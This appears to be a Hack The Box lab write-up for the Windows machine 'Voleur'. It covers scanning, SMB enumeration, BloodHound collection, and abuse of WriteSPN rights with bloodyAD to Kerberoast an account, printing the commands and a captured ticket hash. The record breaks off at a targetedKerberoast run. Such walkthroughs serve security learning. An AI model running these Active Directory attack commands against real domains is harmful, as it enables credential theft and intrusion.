---
title: Voleur
date: 2026-06-05
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - medium
  - Nmap-ad
  - Port139-135-SMB-NTLM-False
  - Port88-LDAP-getST
  - Bloodhound-Collect-Nxc-failed
  - Bloodhound-Collect-rusthound
  - Bloodhound-Vectory-Where-Outbound
  - Port369-LDAP-ldapsearch-failed
  - Bloodhound-Vectory-WriteSPN
  - Bloodhound-Remote-Management
  - Lateral-Movement-Mimikatz
  - Windows-Privilege-winpeas
  - Port369-LDAP-deleted-account-windows
  - Windows-Privilege-Escalation-DPAPI
  - port139-135-smb-smbclient-py
  - Lateral-Movement-RunasCs
  - Windows-Privilege-Escalation-Dataleak-Lazagne
  - Lateral-Movement-RunasCs-1
  - ssh-idrsa-decode
lastmod: 2026-06-15T06:25:21.674Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Voleur" >}}

***

# Recon

### PORT & IP SCAN

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-ad" >}} That is the Active Directory AD ad look like

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $cat serviceScan.txt
# Nmap 7.95 scan initiated Fri Jun  5 16:44:35 2026 as: nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,49674,49675,62631,62637,62656 -T4 -oN serviceScan.txt --min-rate 10000 10.129.8.21
Nmap scan report for 10.129.8.21
Host is up (0.52s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-05 16:44:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
62631/tcp open  msrpc         Microsoft Windows RPC
62637/tcp open  msrpc         Microsoft Windows RPC
62656/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 7h59m45s
| smb2-time:
|   date: 2026-06-05T16:45:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  5 16:46:40 2026 -- 1 IP address (1 host up) scanned in 124.39 seconds

```

### DNS

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $nxc smb 10.129.8.21 --generate-hosts-file  hosts
SMB         10.129.8.21     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $ cat hosts
10.129.8.21     DC.voleur.htb voleur.htb DC

```

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.129.244.79   browsedinternals.htb
10.129.8.21     DC.voleur.htb voleur.htb DC


::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
```

### SMB

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-NTLM-False" >}} STATUS\_NOT\_SUPPORTED means that NTLM auth is disabled. netexec also shows this as “NTLM:False”. With Kerberos (after making sure my clock is aligned with sudo ntpdate voleur.htb), it works to fix the KRB5KRB-AP-ERR-SKEW  error

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $sudo ntpdate voleur.htb
2026-06-06 01:53:09.562023 (+0800) -0.000478 +/- 0.117045 voleur.htb 10.129.8.21 s1 no-leap
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
└──╼ $netexec smb 10.129.8.21 -u ryan.naylor -p HollowOct31Nyt -k
SMB         10.129.8.21     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.8.21     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port88-LDAP-getST" >}} In the Active Directory , using the getTGT.py  to impersonate users so that dont need to username and password to have ccache  .

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ sudo ntpdate voleur.htb
2026-06-07 06:22:29.653942 (+0800) +28794.305868 +/- 0.171852 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.305868
                                                                                      
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ /usr/share/doc/python3-impacket/examples/getTGT.py  'voleur.htb/ryan.naylor:HollowOct31Nyt' -dc-ip 10.129.8.132
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache

```

{{< toggle "Tag 🏷️" >}}

{{< tag "port139-135-smb-smbclient-py" >}} with the ccache to use the smbclient.py to do the interactive with SMB

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ export KRB5CCNAME=ryan.naylor.ccache 
```

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ sudo ntpdate voleur.htb                                               
2026-06-07 06:25:03.309224 (+0800) +28794.329032 +/- 0.145297 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.329032
                                                                                      
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ /usr/share/doc/python3-impacket/examples/smbclient.py -k DC.voleur.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# 

```

Or I can use `smbclient` (with the `krb5.conf` in place):

```
oxdf@hacky$ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
Try "help" to get a list of possible commands.
smb: \> 
```

the finance and HR should not be here, but both i cant get in

```
# cd Finance
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use SYSVOL
# 

```

```
# use SYSVOL
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 cUzCKZaWRu
drw-rw-rw-          0  Wed Jan 29 17:09:22 2025 JeEpPnwbhR
drw-rw-rw-          0  Wed Jan 29 16:52:47 2025 sKMvLqtIRP
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 voleur.htb
# cd voleur.htb
# ls
drw-rw-rw-          0  Wed Jan 29 16:48:44 2025 .
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 ..
drw-rw-rw-          0  Sun Jun  7 06:09:48 2026 DfsrPrivate
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 Policies
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 scripts
# cd Policies
# ls
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 .
drw-rw-rw-          0  Wed Jan 29 16:48:44 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Wed Jan 29 20:45:57 2025 {6AC1786C-016F-11D2-945F-00C04fB984F9}
# {31B2F340-016D-11D2-945F-00C04FB984F9}
*** Unknown syntax: {31B2F340-016D-11D2-945F-00C04FB984F9}
# ls
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 .
drw-rw-rw-          0  Wed Jan 29 16:48:44 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Wed Jan 29 20:45:57 2025 {6AC1786C-016F-11D2-945F-00C04fB984F9}
# cd {31B2F340-016D-11D2-945F-00C04FB984F9}
# ls
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 .
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 ..
-rw-rw-rw-         22  Thu May  8 08:01:14 2025 GPT.INI
drw-rw-rw-          0  Thu May  8 07:59:28 2025 MACHINE
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 USER
# cd Machine
# ls
drw-rw-rw-          0  Thu May  8 07:59:28 2025 .
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 Microsoft
-rw-rw-rw-       2788  Wed Jan 29 16:49:11 2025 Registry.pol
drw-rw-rw-          0  Thu May  8 07:59:28 2025 Scripts
# cd Microsoft
# ls
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 .
drw-rw-rw-          0  Thu May  8 07:59:28 2025 ..
drw-rw-rw-          0  Thu May  8 08:01:02 2025 Windows NT
# cd Windows NT
# ls
drw-rw-rw-          0  Thu May  8 08:01:02 2025 .
drw-rw-rw-          0  Wed Jan 29 16:42:32 2025 ..
drw-rw-rw-          0  Thu May  8 08:01:02 2025 Audit
drw-rw-rw-          0  Thu May  8 08:00:32 2025 SecEdit
# cd SecEdit
# ls
drw-rw-rw-          0  Thu May  8 08:00:32 2025 .
drw-rw-rw-          0  Thu May  8 08:01:02 2025 ..
-rw-rw-rw-       1214  Thu May  8 08:00:32 2025 GptTmpl.inf
# cat GptTmpl.inf
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Version]
signature="$CHICAGO$"
Revision=1
[Event Audit]
AuditAccountManage = 1
AuditDSAccess = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1

```

```
# cd /
# tree
/voleur.htb/DfsrPrivate
/voleur.htb/Policies
/voleur.htb/scripts
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Shutdown
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Startup
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv
/voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
/voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Finished - 32 files and folders
# 

```

```
# cat GptTmpl.inf
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20
SeAuditPrivilege = *S-1-5-19,*S-1-5-20
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544
SeInteractiveLogonRight = *S-1-5-32-545,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-32-551,*S-1-5-32-544,*S-1-5-32-548
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel=4,5
MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\RestrictReceivingNTLMTraffic=4,2
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Collect-Nxc-failed" >}} Due to error of S-1-5-21-3927696377-1337352550-2781715495-512 , so failed to collect the data to blood

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ netexec ldap DC.voleur.htb   -u ryan.naylor -p HollowOct31Nyt -k  --bloodhound -c All --dns-server 10.129.8.132

LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        DC.voleur.htb   389    DC               Resolved collection methods: dcom, objectprops, trusts, group, psremote, localadmin, container, rdp, session, acl
LDAP        DC.voleur.htb   389    DC               Using kerberos auth without ccache, getting TGT
[22:48:37] ERROR    Failure to authenticate with LDAP! Error 80090302: LdapErr: DSID-0C090930, comment: AcceptSecurityContext error, data 1, v4f7c : Code: authentication.py:178
                    49                                                                                                                                                          
Exception in thread Thread-4 (_handle_results):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/ad/utils.py", line 474, in resolve_aces
    linkitem = self.addomain.newsidcache.get(ace['sid'])
  File "/usr/lib/python3/dist-packages/bloodhound/ad/utils.py", line 576, in get
    return self._cache[entry]
           ~~~~~~~~~~~^^^^^^^
KeyError: 'S-1-5-21-3927696377-1337352550-2781715495-512'

During handling of the above exception, another exception occurred:


```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Collect-rusthound" >}} Collect the Data from rusthound-ce

{{< /toggle >}}

```autohotkey
https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.7/rusthound-ce-Linux-gnu-x86_64.tar.gz
```

```autohotkey
tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur/RustHound-CE]
└─$ ./rusthound-ce --domain voleur.htb  -u ryan.naylor  -p 'HollowOct31Nyt' --zip

---------------------------------------------------
Initializing RustHound-CE at 23:05:49 on 06/06/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-06T15:05:49Z INFO  rusthound_ce] Verbosity level: Info
[2026-06-06T15:05:49Z INFO  rusthound_ce] Collection method: All
[2026-06-06T15:05:49Z INFO  rusthound_ce::ldap] Connected to VOLEUR.HTB Active Directory!
[2026-06-06T15:05:49Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-06-06T15:05:50Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-06T15:05:51Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=voleur,DC=htb
[2026-06-06T15:05:51Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-06T15:05:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=voleur,DC=htb
[2026-06-06T15:05:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-06T15:05:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=voleur,DC=htb
[2026-06-06T15:05:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-06T15:05:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=voleur,DC=htb
[2026-06-06T15:05:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-06-06T15:05:57Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=voleur,DC=htb
[2026-06-06T15:05:57Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-06-06T15:05:57Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-06-06T15:05:57Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 5 ous parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-06-06T15:05:57Z INFO  rusthound_ce::json::maker::common] .//20260606230557_voleur-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 23:05:57 on 06/06/26! Happy Graphing!

```

i did the setup befores

```
                                                                              
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ bloodhound
[sudo] password for parallels: 

 Starting neo4j
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:30811). It is available at http://localhost:7474
There may be a short delay until the server is ready.
.....................

```

![Pasted image 20260606231935.png](/ob/Pasted%20image%2020260606231935.png)

My owned user dont have any outhound

After having all user , just need to know who can outhound

### Outbound

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-Where-Outbound" >}} Checking who has the outbound can clearly help you decide your attack direction , If you dont have that account owned direction , back to enumerate to find you need user -k --kerberoasting to have the hashes

{{< /toggle >}}

```
MATCH (u:User)-[r]->(target)
WHERE u.domain = "VOLEUR.HTB"
RETURN u, r, target
```

![Pasted image 20260606232832.png](/ob/Pasted%20image%2020260606232832.png)

The Guest and Administrator can be igorned, so we just force on SVC\_LDAP

### WriteSPN

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-WriteSPN" >}} The user has the WriteSPN to another user and using the bloodyAD to abuse ,and using the netexec 's --kerberoasting to have the hashes   ,also can try with targetedKerberoast.py to do it .

{{< /toggle >}}

![Pasted image 20260606232947.png](/ob/Pasted%20image%2020260606232947.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ bloodyAD -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --host DC.voleur.htb set object svc_winrm servicePrincipalName -v 'http/whatever'
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 26, in object
    conn.ldap.bloodymodify(
    ^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/config.py", line 128, in ldap
    self._ldap = Ldap(self)
                 ~~~~^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 185, in __init__
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 172, in __init__
    raise err
msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: "invalidCredentials" Reason: "b'80090302: LdapErr: DSID-0C090770, comment: AcceptSecurityContext error, data 1, v4f7c\x00'"                                                                                                                                                         

                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ sudo ntpdate voleur.htb                                                                                                                  
2026-06-07 07:54:09.769942 (+0800) +28794.421005 +/- 0.148549 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.421005
                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
[+] svc_winrm's servicePrincipalName has been updated

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ sudo ntpdate voleur.htb                                                                                                                  
2026-06-07 07:57:01.512116 (+0800) +28794.462702 +/- 0.118044 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.462702
                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ netexec ldap DC.voleur.htb  -u svc_ldap  -p  M1XyC9pW7qT5Vn  -k --kerberoasting kerberoasting.hashes
LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        DC.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        DC.voleur.htb   389    DC               [*] Total of records returned 1
LDAP        DC.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 17:10:12.398769, lastLogon: 2025-01-29 23:07:32.711487
LDAP        DC.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$9d49b855eaf3a4adeee3a09f00f8ddee$35b1f8acce8f249087211c115d8802d338492158456f9ba17e6448d3070e2e71770bae37dbaffab589b39eb545b7a0f813277e3ef06b00e52cb3edc45357bf511d0f72669d719e9537c51990aaef45ae74e4f1ecb588225100b9d8acd03b9d74793fa440422b7cab983fa05e3a97e1430be3d4ad5b0a10d9fc38238484f9c0c2a083d9801dccb92883a7673f5c6c9515cbc2279b4c3de39b2cd20a6a1da98b0fb2dfb3b24fd149be97eeaf19665ddab2efca361b3efa52c7829486a7f47ff4995b27a287e0d434c0ee41d056f47252c2b5ce938af3d32dffc52f4f6f256f2040303452f43bb4efabc28fddf8984c23248e09e5fb03f6a3006a21058ef4db7261dfd4eba5b8d428d6c4a9f7f54f11567e36ca16674d3d076bc83520e147b7e74cd6420d913d51edcdbccc040143bbc16c22a26063deed91206203278dc73604747157b0411985ca6b72b9ef4b54cf4a81b810fff0880df398df66beeab56f953deb34779a4da9cadd78b5832491a6b28bbb128608b1532e22294df8c7164e5356c418be4bd55c5039bf320cd9a6d2ef0749f6ffb66967f5be8a131a457e76141c83e905e191456ead80cc3b42280d6e3ae30c2836751976177bc456d89cd4717b8157d6d6399df2c991d5eeda2df8887ecd14616fdb30739cc442b6093616264f62eff74f5fb399901937f73b8b9c67da3162305d041f97d116b74c9090eaf52c1210701cd90b322df52e370127d005f9d2c8d4de1b9c0b33119fbcd744e94583750bd6b68832fe4c27caddc82bd73abbb9b7171a845c5867baaa05877619e48bff319309cba9c6664c2f9e65ec6784ec4dc9b6edcd5129d5f610abb50d3c58b3224a5f19c2db25a4e796f4b2103b8f293042813cd33c2ce77fe5af899d3943747900989a6e8673e0c71d75eb9ec55226a459d7ac8dd8e58f0b2a58469f9eab525978fb353d26c0c17e744f37a42f3f135f00d26aa99d7e81bf89dfa26191424e4e377b66951f8055725a07eabcb6321f2ccada7df39819b9aa6dc719b11eff89ac4d163c1cc8f1425a80a0e47e72f73a7c0e7e36d463fb8d7c8e27a5597df6dc5821d114a3440f085c4c6c2c1b2a24c6c45d3e1b90db7c2b5d2b972eea51f44c83c65fa261cca894c846820aee2a54448ce5a6cc88ec2ccb1c20b75cd7d848c186da3c3e741e69f58e349772ad486ca7346fbad7fba7e08a94e9c1e356b24f8fb838e62ccf9f72df04c8f6ce60acd31582a6831638f454ed346a4501200de1f9e5396e5d6b89d926510a8b3f848954dc492e8c258e7130ed5d3f3ba373f938abaf4758079ee6fc2f4ea938f481c5e38952b7427ffbabec3a7121d39c9a493a3c072a6d07a481d4960b2a7e10cf1a2ea2f9ef1075a78ef50a66660596cb1a1a51e0b7ac43b3ab705009d0a94f0e8300122285a3bee0db42608219c6367e2e90d1d1b5d89cd224134df8f001da3e4f19b45873e3      
```

### targetedKerberoast

also can try with targetedKerberoast.py to do it

```
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ sudo ntpdate voleur.htb                                                                                                                              
2026-06-07 08:01:43.274166 (+0800) +28794.411846 +/- 0.168085 voleur.htb 10.129.8.132 s1 no-leap
CLOCK: time stepped by 28794.411846
                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
└─$ /home/parallels/Desktop/targetedKerberoast/targetedKerberoast.py  -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -f hashcat --dc-host DC.voleur.htb -k
[*] Starting kerberoast attacks
